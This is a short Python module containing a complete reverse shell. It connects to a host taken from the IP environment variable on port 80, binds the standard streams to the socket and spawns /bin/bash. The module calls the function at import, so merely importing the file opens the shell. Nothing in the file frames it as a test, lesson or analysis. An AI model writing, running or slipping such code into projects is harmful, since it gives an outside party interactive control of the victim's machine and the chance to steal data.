import socket
import subprocess
import os
import pty

def reverse_shell():
    ip = os.environ.get("IP")
    port = 80
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    pty.spawn("/bin/bash")

# Execute the reverse shell upon import
reverse_shell()
